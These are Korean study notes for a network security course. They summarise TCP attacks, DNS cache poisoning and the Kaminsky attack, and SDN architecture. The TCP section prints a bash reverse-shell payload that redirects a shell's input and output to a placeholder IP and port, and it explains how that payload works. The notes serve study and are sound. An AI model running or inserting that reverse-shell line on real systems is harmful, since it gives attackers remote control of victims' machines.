> 네트워크 보안 · 통합 정리
> 학습내용: 6장 TCP 공격 · 7장 DNS 공격 · 13장 SDN 핵심을 한 줄씩 압축

## 1. 6장 — TCP 공격

### (1) TCP vs UDP (Q1/Q2)
- **TCP**: **byte stream** → 메시지 경계 없음(`write` ≠ `read` 1:1). 연결은 **4-tuple**(src IP·port, dst IP·port)로 구분돼 서로 **안 섞임**.
- **UDP**: **datagram** → 메시지 **경계 보존**, 단일 소켓에 여러 출처가 **섞여 들어옴**.

| 구분 | TCP | UDP |
|---|---|---|
| 데이터 모델 | byte stream(경계 없음) | datagram(경계 보존) |
| write/read | 1:1 아님 | 1:1 |
| 다중 출처 | 4-tuple로 분리 | 한 소켓에 혼재 |

### (2) SYN Flooding ★
- **노림**: **half-open SYN queue 고갈** — 위조 IP로 SYN만 보내고 마지막 **ACK를 안 줌**.
- **로컬에서 공격이 실패하는 이유**: **SYN cookie ON** · 도달 가능한 IP는 **RST로 응답** · **큐가 큼** · **tcp_metrics 캐시**.
- **SYN cookie**: half-open 상태를 **저장하지 않고** 정보를 **ISN에 인코딩**(stateless) → **고갈 대상 자체를 없앰**.

### (3) TCP RST 공격 ★
- **전제**: TCP는 인증/암호화 없음 + **sniff로 4-tuple·seq 노출**.
- **공격**: 4-tuple + **윈도 안의 seq** + **RST 플래그**를 위조해 연결을 강제 종료.
- **조작 필드**: src/dst IP, src/dst port, **sequence number**, **RST 플래그**. (seq = **잡은 패킷의 ack** 값)

### (4) Session Hijacking ★★
- **established 연결**에 **ACK + 데이터**를 위조 주입.
- **seq = 다음 기대값**(sniff한 seq + 데이터 길이)으로 맞춰 **윈도 정합** → 성공률↑.
- **42쪽(desync)**: 주입 후 양쪽 seq가 어긋나(**desync**) 서로 패킷을 **drop** → **ACK storm**으로 원래 세션이 망가짐.

### (5) Reverse vs Remote(Bind) Shell ★
| 구분 | 방향 | 방화벽 |
|---|---|---|
| **Reverse** | 피해자 → 공격자(**outbound**) | **우회**(보통 통과) |
| **Remote/Bind** | 공격자 → 피해자(**inbound**) | **차단**됨 |

- 주입 페이로드:

```bash
/bin/bash -i >/dev/tcp/ip/port 0<&1 2>&1
```

- **fd 1(stdout)→소켓**, **fd 0(stdin)←소켓**, **fd 2(stderr)→소켓**으로 redirect → shell의 **I/O 전부를 공격자 TCP 연결에 묶음**.

## 2. 7장 — DNS 공격

### (1) Domain vs Zone
- **Domain**: 이름의 **논리적 subtree 전체**.
- **Zone**: 한 네임서버가 **실제 책임지는 구간**(위임된 하위는 제외).

### (2) Query process
1. resolver가 **`/etc/hosts` 먼저** 확인.
2. **`/etc/resolv.conf`** 의 **local DNS**에 질의.
3. local DNS가 **cache** 후 **iterative**(root → TLD → authoritative)로 추적, **TTL** 동안 캐싱.

### (3) dig / Root zone
- `@server` = **특정 서버 직접 질의**, `+trace` = **단계별 추적**, `-p` = **포트 지정**, `rndc flush` = **캐시 비움**.
- **Root zone** = **13개 root 서버** + 각 **TLD 위임**(NS + glue), **root hints(db.root)** 로 시작점 확보.

### (4) Attack surface (파급력 순) ★
| 단계 | 대상 | 범위/파급력 |
|---|---|---|
| ① | 로컬 파일(hosts) | 1대 |
| ② | User ↔ LocalDNS | LAN |
| ③ | LocalDNS ↔ 인터넷 = **cache poisoning** | 다수·원격 |
| ④ | **authoritative 장악** | **전세계(최대)** |

### (5) Cache poisoning
- **sniff로 Transaction ID·src port 복사** → 가짜 응답을 **진짜보다 먼저** 주입.
- **AUTHORITY에 NS 위조**를 넣으면 **도메인 전체 hijack**.

### (6) Kaminsky ★★
- **원격이라 sniff 불가** → **Transaction ID(16bit) 추측**.
- **Challenge 1**: 진짜 응답보다 **먼저 도착**해야 함(race).
- **Challenge 2**: 정답이 **캐싱되면 TTL 동안 재시도 불가**.
- **해결(공격 성립 조건)**: **랜덤 서브도메인**(cache miss로 **무한 재시도**) + **authority에 NS 위조**(한 번만 이겨도 **도메인 전체 탈취**).

## 3. 13장 — SDN

### (1) 왜 개발됐나
- 전통 네트워크는 **control plane이 라우터마다 분산** → 관리 어렵고 **traffic engineering·load balancing·정책 라우팅 불가**, **닫힌 구조**라 혁신 느림.
- → **control plane을 중앙에서 프로그래밍**하자.

### (2) 전통 vs SDN ★
| 구분 | 전통 | SDN |
|---|---|---|
| control plane | 라우터 내 **분산**(수직통합) | **중앙 controller로 분리** |
| forwarding 기준 | **목적지 IP** 기반 | **flow 기반 match + action** |
| 구조 | 폐쇄형 | **개방형** |

### (3) 메인프레임 → PC 유추 (19/20쪽)
- **메인프레임(수직통합) → PC(open interface로 수평 분해 → 폭발적 혁신)** 유추를 네트워크에 적용.
- **open interface의 실체 = OpenFlow**.

### (4) 레이어 구조
- **data-plane switch**(단순 forwarding) / **SDN controller**(network OS, **핵심**) / **control apps**(정책 = 두뇌).
- 핵심 = **중앙집중 controller + control/data 분리**.

### (5) OpenFlow 핵심
- **controller ↔ switch 표준 프로토콜** + **flow table의 match + action** 일반화 forwarding.
- **L2~L4 임의 필드 매칭 + 임의 action**, table은 **controller가 채움**.

### (6) match + action으로 구현
- **router**(IP prefix), **L2 switch**(MAC), **firewall**(IP+port → drop), **NAT**(rewrite), **load balancer · 정책 라우팅** 전부 **통합**.

### (7) Selected Challenges
- **중앙집중의 장점이 곧 약점**:
  - **controller 보안**(단일 고가치 표적)
  - **견고성**(단일 장애점, SPOF)
  - **인터넷 규모 확장성**.

---

### 한 줄 요약
**TCP 공격**은 *인증·암호화 없음 + sniff로 4-tuple·seq 노출*을 토대로 RST 위조·세션 하이재킹·역방향 셸로 이어지고, **DNS 공격**은 *Transaction ID·포트 추측/복사*로 가짜 응답을 먼저 주입하는 cache poisoning·Kaminsky가 핵심이며(파급력은 authoritative 장악이 최대), **SDN**은 *control/data 분리 + 중앙 controller + OpenFlow match+action*으로 유연성을 얻는 대신 **중앙 controller가 곧 단일 표적·단일 장애점**이 된다.
